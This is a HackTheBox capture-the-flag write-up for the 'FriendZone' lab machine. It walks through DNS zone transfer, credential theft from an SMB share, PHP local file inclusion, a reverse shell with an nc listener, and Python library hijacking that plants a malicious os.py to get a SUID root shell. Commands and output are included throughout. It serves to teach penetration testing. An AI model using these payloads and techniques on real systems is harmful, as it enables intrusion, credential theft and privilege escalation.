---
title: HackTheBox - FriendZone
categories: [HackTheBox, HTB-Linux]
date: 2022-09-11
tags: [exploit/file-inclusion/lfi ]
img_path: /Writeups/HackTheBox/Linux/FriendZone/images/
image:
  src: Pasted%20image%2020220911005207.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Overview 
This machine begins w/ a network enumeration w/ `nmap`, a domain name is enumerated `friendzone.red`, DNS enumeration w/ `dig` is carried out to enumerate subdomains. `uploads.friendzone.red` & `administrator1.friendzone.red`. 

Next, there are 2 file share discovered, `Development` - `RW` access & `general` - `R` access. Credentials can be exfiltrated from `general` fileshare, revealing credentials for a login page in `administrator1.friendzone.red`. 

After successfully login, our cookie is created, allowing us to access `dashboard.php` where it is susceptible to LFI.  On `dashboard.php`, the `GET` parameter `pagename` is susceptible to LFI, allowing us to include any file that has a `.php` extension. We are able to upload `php-reverse-shell.php` using the SMB Fileshare `Development`, allowing us to obtain a low-privilege/`www-data` shell.

For the privilege escalation part, we have to privilege escalate twice, to `friend` and then to `root`. On `www-data` home directory, there is a file that contains credentials to `friend`, allowing us to privilege escalate to `friend`.

After enumerating the system w/ `linpeas.sh`, there is a directory called `/opt/server_admin`, that is out of the norm, inside it resides a python script that imports `os` library to print something. Through `pspy64`, it is discovered that the python script is executed every 2 minutes as `root`.  It is exploitable because the library that it is importing is writable, allowing us to replace  the library (`os.py`) w/ a python script that will create `rootbash`, allowing us to privilege escalate to `root`.


---

| Column       | Details      |
| ------------ | ------------ |
| Box Name     | FriendZone   |
| IP           | 10.10.10.123 |
| Points       | -            |
| Difficulty   | Easy         |
| Creator      |  [askar](https://www.hackthebox.com/home/users/profile/17292)             |
| Release Date | 09-Feb-2019  |


# Recon

## TCP/80 (HTTP)
- FFUF
```
200      GET        1l        2w       13c http://10.10.10.123/robots.txt
403      GET       11l       32w      300c http://10.10.10.123/server-status
301      GET        9l       28w      316c http://10.10.10.123/wordpress => http://10.10.10.123/wordpress/
```
- `robots.txt`
- `wordpress`


## TCP/139, 445 (SMB)
- SMBMap
	```
	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb]
	└─# smbmap -H friendzone.htb
	[+] Guest session       IP: friendzone.htb:445  Name: unknown                                           
	 Disk          Permissions     Comment
	 ----          -----------     -------
	 print$        NO ACCESS       Printer Drivers
	 Files         NO ACCESS       FriendZone Samba Server Files /etc/Files
	 general       READ ONLY       FriendZone Samba Server Files
	 Development   READ, WRITE     FriendZone Samba Server Files
	 IPC$          NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
	```
	- `general` - `R`
	- `Development` - `RW`

## TCP/443 (HTTPS)
- NMAP
	```
	PORT    STATE SERVICE  REASON         VERSION
	443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.29
	| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/localityName=AMMAN/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED
	| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/localityName=AMMAN/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED
	```
	- Subdomain
		- `friendzone.red`

## TCP/UDP/53 (DNS)
- DIG - Zone Transfer
	```
	┌──(root💀kali)-[~/htb/friendzone]
	└─# dig axfr @10.10.10.123 friendzone.red
	
	; <<>> DiG 9.18.0-2-Debian <<>> axfr @10.10.10.123 friendzone.red
	; (1 server found)
	;; global options: +cmd
	friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
	friendzone.red.         604800  IN      AAAA    ::1
	friendzone.red.         604800  IN      NS      localhost.
	friendzone.red.         604800  IN      A       127.0.0.1
	administrator1.friendzone.red. 604800 IN A      127.0.0.1
	hr.friendzone.red.      604800  IN      A       127.0.0.1
	uploads.friendzone.red. 604800  IN      A       127.0.0.1
	friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
	;; Query time: 35 msec
	;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
	;; WHEN: Sun Sep 11 16:11:47 +08 2022
	;; XFR size: 8 records (messages 1, bytes 289)
	```
	- Subdomains
		- `administrator1.friendzone.red`
		- `hr.friendzone.red`
		- `uploads.friendzone.red.`

# Initial Foothold


## TCP/139, 445 (SMB) - File Exfiltration
1. Download all files from `general` & `Development` SMB fileshare
	```
	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb/general]
	└─# smbclient //friendzone.htb/general -c 'prompt;recurse;mget *'
	Password for [WORKGROUP\root]:
	getting file \creds.txt of size 57 as creds.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
	
	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb/general]
	└─# cat creds.txt 
	creds for the admin THING:
	
	admin:WORKWORKHhallelujah@#
	
	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb/development]
	└─# smbclient //friendzone.htb/Development -c 'prompt;recurse;mget *'
	Password for [WORKGROUP\root]:
	# No files for Development
	```
	- `admin:WORKWORKHhallelujah@#`


## TCP/443 (HTTP) - Enumerating friendzone.red
1. In the page source of index, saw something interesting
	```
	<!-- Just doing some development here -->
	<!-- /js/js -->
	<!-- Don't go deep ;) -->
	```
2. Proceed to `/js/js`
	![](Pasted%20image%2020220911173351.png)
	- Random `base64` encoded characters is displayed
3. Tried to enumerate some `GET` parameters, nothing interesting is found
4. Based on that, I think it is a rabbit-hole.


## TCP/443 (HTTP) - Enumerating uploads.friendzone.red
1.  Directory enumerate the `uploads.friendzone.red`
	-  `uploads.friendzone.red.`
		```
		┌──(root💀kali)-[~/htb/friendzone]
		└─# ffuf -u https://uploads.friendzone.red/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.php,.txt'
		
		files                   [Status: 301, Size: 334, Words: 20, Lines: 10]
		upload.php              [Status: 200, Size: 38, Words: 8, Lines: 1]
		```
		- `files` 
			- Files uploaded by `upload.php` does not end up here 
			- OR the uploaded files are renamed
2. Attempt to upload a file, regardless of whatever the file is, even if nothing is uploaded, it says successfully uploaded.
3. Based on that, I think it is a rabbit-hole.




## TCP/443 (HTTP) - Enumerating administrator1.friendzone.red
1. Directory enumerate the `administrator1.friendzone.red`
	- `administrator1.friendzone.red`
		```
		┌──(root💀kali)-[~/htb/friendzone]
		└─# ffuf -u https://administrator1.friendzone.red/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.php,.txt'
		
		images                  [Status: 301, Size: 349, Words: 20, Lines: 10]
		login.php               [Status: 200, Size: 7, Words: 2, Lines: 1]
		dashboard.php           [Status: 200, Size: 101, Words: 12, Lines: 1]
		timestamp.php           [Status: 200, Size: 36, Words: 5, Lines: 1]
		                        [Status: 200, Size: 2873, Words: 393, Lines: 123]
		.php                    [Status: 403, Size: 309, Words: 22, Lines: 12]
		server-status           [Status: 403, Size: 318, Words: 22, Lines: 12]
		:: Progress: [442314/661638] :: Job [1/1] :: 1106 req/sec :: Duration: [0:06:54] :: Errors: 0 ::
		```
		- `images` 
			- Contains 2 `.jpg` images, used in `dashboard.php`
		- `timestamp.php`
			- Displays timestamp, used in `dashboard.php`
2. Proceed to `administrator1.friendzone.red` & login w/ `admin:WORKWORKHhallelujah@#`
	![](Pasted%20image%2020220911161807.png)
3. Proceed to `/dashboard.php`
	```
	image_id=a.jpg&pagename=timestamp
	```
	![](Pasted%20image%2020220911172320.png)
	- `timestamp` - earlier we enumerated it, the webpage is including `timestamp.php`
4. Enumerating `GET` parameters
	- `image_id`
		- Able to display images from `/image` directory
		- Enumerated it against `LFI` & `Command Injection` payloads, nothing is displayed, this is because the webpage is coded to only display images.
	- `pagename`
		- Based on how the webpage included `timestamp`, we are able to assume that `.php` is appended before the file is included.
			```
			# Hypothesis
			include $_GET[pagename] . '.php'
			```
5. We are able to view the source code of the webpage by "exploiting" `GET` parameter `pagename` by base64 encoding it
	- `timestamp.php`
		```
		┌──(root💀kali)-[~/htb/friendzone]
		└─# curl -ks -H "Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1; sid=62febea0-31b0-11ed-a80f-e52e5d473100" 'https://administrator1.friendzone.red/dashboard.php?image_id=test&pagename=php://filter/convert.base64-encode/resource=timestamp' | cut -d '>' -f21 | base64 -d
		<?php
		
		
		$time_final = time() + 3600;
		
		echo "Final Access timestamp is $time_final";
		
		
		?>
		```
		- Nothing interesting
	- `dashboard.php`
		```
		┌──(root💀kali)-[~/htb/friendzone]
		└─# curl -ks -H "Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1; sid=62febea0-31b0-11ed-a80f-e52e5d473100" 'https://administrator1.friendzone.red/dashboard.php?image_id=test&pagename=php://filter/convert.base64-encode/resource=dashboard' | cut -d '>' -f21 | base64 -d
		<?php
		
		//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
		//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
		echo "<title>FriendZone Admin !</title>";
		$auth = $_COOKIE["FriendZoneAuth"];
		
		if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
		 echo "<br><br><br>";
		
		echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
		echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
		
		if(!isset($_GET["image_id"])){
		  echo "<br><br>";
		  echo "<center><p>image_name param is missed !</p></center>";
		  echo "<center><p>please enter it to show the image</p></center>";
		  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
		 }else{
		 $image = $_GET["image_id"];
		 echo "<center><img src='images/$image'></center>";
		
		 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
		 include($_GET["pagename"].".php");
		 //echo $_GET["pagename"];
		 }
		}else{
		echo "<center><p>You can't see the content ! , please login !</center></p>";
		}
		?>
		```
		- Based on this, we are able to do directory traversal and include a file w/ `.php` extension
6. We are able to spawn a shell if we are able to somehow upload a `php-reverse-shell.php`.
7. Earlier, while enumerating `TCP/139,445 (SMB)`, there is a fileshare `Development` that we have `RW` access to it



## TCP/139, 445 (SMB) - Upload php-reverse-shell.php
1. Upload a `php-reverse-shell.php`
	```
	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb/development]                                                                                                        
	└─# smbclient //friendzone.htb/Development                                                                                                                                  
	Password for [WORKGROUP\root]:                                                                                                                                              
	Try "help" to get a list of possible commands.                                                                                                                                             
	smb: \> put php-reverse-shell.php                                                                                                                                           
	putting file php-reverse-shell.php as \php-reverse-shell.php (49.7 kb/s) (average 49.7 kb/s)                                                                                
	smb: \> ls                                                                                                                                                                  
	  .                                   D        0  Sun Sep 11 03:08:14 2022                                                                                                  
	  ..                                  D        0  Thu Jan 24 05:51:02 2019                                                                                                  
	  php-reverse-shell.php               A     5493  Sun Sep 11 03:08:14 2022                                                                                                  
	                                                                                                                                                                            
	                9221460 blocks of size 1024. 6214168 blocks available     
	```
2. The comment of `Files` fileshare is **key** to uncovering the FULL PATH of `Development` fileshare on the system
	```
	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb]
	└─# smbmap -H friendzone.htb
	[+] Guest session       IP: friendzone.htb:445  Name: unknown                                           
	 Disk          Permissions     Comment
	 ----          -----------     -------
	 print$        NO ACCESS       Printer Drivers
	 Files         NO ACCESS       FriendZone Samba Server Files /etc/Files
	 general       READ ONLY       FriendZone Samba Server Files
	 Development   READ, WRITE     FriendZone Samba Server Files
	 IPC$          NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
	```
	- We can assume that `Development` fileshare resides in `/etc/Development`

## TCP/443 (HTTPS) - Execute reverse shell
1. Start a listener
	```
	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot]
	└─# nc -nvlp 4444
	Ncat: Version 7.92 ( https://nmap.org/ncat )
	Ncat: Listening on :::4444
	Ncat: Listening on 0.0.0.0:4444
	```
2. Execute our reverse shell
	```
	┌──(root💀kali)-[~/htb/friendzone]
	└─# curl -ks -H "Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1; sid=62febea0-31b0-11ed-a80f-e52e5d473100" 'https://administrator1.friendzone.red/dashboard.php?image_id=test&pagename=../../../../../etc/Development/php-reverse-shell'
	```
3. `www-data` shell obtained
	![](Pasted%20image%2020220911183309.png)
4. User Flag
	```
	www-data@FriendZone:/var/www$ cd /home
	www-data@FriendZone:/home$ ls
	friend
	www-data@FriendZone:/home$ cd friend
	www-data@FriendZone:/home/friend$ ls
	user.txt
	www-data@FriendZone:/home/friend$ cat user.txt 
	a9ed20acecd6c5b6b52f474e15ae9a11
	www-data@FriendZone:/home/friend$ 
	```
1. Demo - LFI2RCE
	<html>
	<head>
	<link rel="stylesheet" type="text/css" href="/asciinema-player.css" />
	</head>
	<body>
	<div id="lfi2rce"></div>
	<script src="/asciinema-player.min.js"></script>
	<script>
		AsciinemaPlayer.create('https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/FriendZone/images/lfi2rce.cast', document.getElementById('lfi2rce'), { 
		loop: true,
		autoPlay: true
			});
	</script>
	</body>
	</html>



# Privilege Escalation

## Friend - Via File containing creds
1. Found something interesting in `/var/www`
	```
	www-data@FriendZone:/var/www$ ls -l
	total 28
	drwxr-xr-x 3 root root 4096 Jan 16  2019 admin
	drwxr-xr-x 4 root root 4096 Oct  6  2018 friendzone
	drwxr-xr-x 2 root root 4096 Oct  6  2018 friendzoneportal
	drwxr-xr-x 2 root root 4096 Jan 15  2019 friendzoneportaladmin
	drwxr-xr-x 3 root root 4096 Oct  6  2018 html
	-rw-r--r-- 1 root root  116 Oct  6  2018 mysql_data.conf
	drwxr-xr-x 3 root root 4096 Oct  6  2018 uploads
	
	
	www-data@FriendZone:/var/www$ cat mysql_data.conf 
	for development process this is the mysql creds for user friend
	
	db_user=friend
	
	db_pass=Agpyu12!0.213$
	
	db_name=FZ
	www-data@FriendZone:/var/www$ 
	```
	- `friend:Agpyu12!0.213$`
2. SSH w/ `friend:Agpyu12!0.213$`
	```
	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot]
	└─# sshpass -p 'Agpyu12!0.213$' ssh friend@friendzone.htb
	```
	![](Pasted%20image%2020220911184320.png)


## Root - Via Python Library Hijacking
1. Found something interesting w/ `linpeas.sh`
	![](Pasted%20image%2020220911203348.png)
	- `server_admin`
2. View files in `server_admin` directory
	```
	friend@FriendZone:/tmp$ ls -la /opt/server_admin/
	total 12
	drwxr-xr-x 2 root root 4096 Jan 24  2019 .
	drwxr-xr-x 3 root root 4096 Oct  6  2018 ..
	-rwxr--r-- 1 root root  424 Jan 16  2019 reporter.py
	```
	- There should be a cronjob executing `reporter.py`
3. Verify that there is a cronjob running w/ `pspy64`
	![](Pasted%20image%2020220911222349.png)
	- There is a cronjob executing `/opt/server_admin/reporter.py` as `root` every 2 minutes
4. View contents of `/opt/server_admin/reporter.py`
	```
	friend@FriendZone:/tmp$ cat /opt/server_admin/reporter.py
	#!/usr/bin/python
	
	import os
	
	to_address = "admin1@friendzone.com"
	from_address = "admin2@friendzone.com"
	
	print "[+] Trying to send email to %s"%to_address
	
	#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
	
	#os.system(command)
	
	# I need to edit the script later
	# Sam ~ python developer
	```
	- We can potentially do `python` library hijacking
5.  Exploiting `reporter.py`
	- How do we exploit `reporter.py`
		- Python code in one [module](https://docs.python.org/3/glossary.html#term-module) gains access to the code in another module by the process of [importing](https://docs.python.org/3/glossary.html#term-importing) it.
		- If we have write access to the library (`os.py`) that `reporter.py` is importing, we are able to replace it w/ a python script to create `rootbash`
		- `rootbash` - `/bin/bash` w/ SUID bit set.

	1. Check if library `os` writable
		```
		friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os                                                                                                                      
		```
		![](Pasted%20image%2020220911230640.png)
		- `os.py` - `RWX`
	2. Make a copy of `os.py` called `os_bak.py`
		```
		friend@FriendZone:/usr/lib/python2.7$ cp /usr/lib/python2.7/os.py /usr/lib/python2.7/os_bak.py                                                                                            
		```
		- We'll need this for writing our python script to create `rootbash`
	3. Create our python script called `os.py` 
		```
		friend@FriendZone:/tmp$ cat os.py
		import os_bak
		os_bak.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")
		```
	4. Replace `/usr/lib/python2.7/os.py` w/ `/tmp/os.py`
		```
		friend@FriendZone:/tmp$ cp /tmp/os.py /usr/lib/python2.7/os.py 
		```
	5. Wait for cronjob to execute, `rootbash` will be created
	6. Obtain `root`
		```
		friend@FriendZone:/tmp$ /tmp/rootbash -p
		```
		![](Pasted%20image%2020220911231617.png)
6. Root Flag
	```
	rootbash-4.4# cat root.txt 
	b0e6c60b82cf96e9855ac1656a9e90c7
	```
7. Demo - Python Library Hijacking Privilege Escalation
	<html>
	<head>
	<link rel="stylesheet" type="text/css" href="/asciinema-player.css" />
	</head>
	<body>
	<div id="python_hijacking"></div>
	<script src="/asciinema-player.min.js"></script>
	<script>
		AsciinemaPlayer.create('https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/FriendZone/images/python_hijacking.cast', document.getElementById('python_hijacking'), { 
		loop: true,
		autoPlay: true
			});
	</script>
	</body>
	</html>
	


